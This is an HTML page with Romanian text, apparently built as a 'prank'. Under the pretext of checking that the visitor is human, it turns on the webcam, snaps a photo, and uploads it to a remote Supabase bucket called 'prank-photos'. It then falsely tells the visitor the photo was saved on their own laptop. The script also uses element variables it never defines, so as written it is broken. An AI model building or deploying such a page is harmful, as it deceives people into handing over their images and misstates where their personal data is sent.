<!DOCTYPE html>
<html lang="ro">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>saaaaluuuut</title>

  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #111;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    .box {
      width: 90%;
      max-width: 500px;
    }

    video {
      width: 100%;
      border-radius: 15px;
      margin-top: 20px;
    }

    button {
      padding: 15px 25px;
      border: 0;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 20px;
    }

    #start {
      background: #2196f3;
      color: white;
    }
  </style>
</head>

<body>

<div class="box">

  <h1>saaaaaaaaaaluuuuuuuuut</h1>

  <p id="status">
    Deschide pentru a continua.
  </p>

  <button id="start">
    Deschide 
  </button>

  <video id="camera" autoplay playsinline></video>

</div>

<script>
const SUPABASE_URL = "https://mexgmskswdstrqkzgvjc.supabase.co";
const SUPABASE_KEY = "CHEIA_TA_ANON";
const BUCKET = "prank-photos";
let stream;

startButton.addEventListener("click", async () => {

  try {

    stream = await navigator.mediaDevices.getUserMedia({
      video: true,
      audio: false
    });

    video.srcObject = stream;

    startButton.style.display = "none";
    statusText.textContent = "stai nemiscat sa vedem ca esti om.";

    setTimeout(() => {

      const canvas = document.createElement("canvas");

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d");

      ctx.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
      );

      canvas.toBlob(async (blob) => {

        if (!blob) return;

        const accept = confirm(
          "superb?"
        );

        if (!accept) {
          statusText.textContent =
            "mai incearca.";

          stream.getTracks().forEach(track => track.stop());
          video.style.display = "none";

          return;
        }

        statusText.textContent =
          "asteptam...";

        try {

          const formData = new FormData();

          formData.append(
            "photo",
            blob,
            "photo.jpg"
          );

         const response = await fetch(
  `${SUPABASE_URL}/storage/v1/object/${BUCKET}/photo-${Date.now()}.jpg`,
  {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${SUPABASE_KEY}`,
      "apikey": SUPABASE_KEY,
      "Content-Type": "image/jpeg"
    },
    body: blob
  }
);
          const data = await response.json();

          if (!response.ok) {
            throw new Error(
              data.error || "Upload failed"
            );
          }

          statusText.textContent =
            "✅ Fotografia a fost salvată pe laptop!";

        } catch (error) {

          console.error(error);

          statusText.textContent =
            "❌ mai incearca.";

        }

        stream.getTracks().forEach(track => track.stop());
        video.style.display = "none";

      }, "image/jpeg", 0.9);

    }, 1000);

  } catch (error) {

    console.error(error);

    statusText.textContent =
      "❌  eroare.";

  }

});
</script>

</body>
</html>
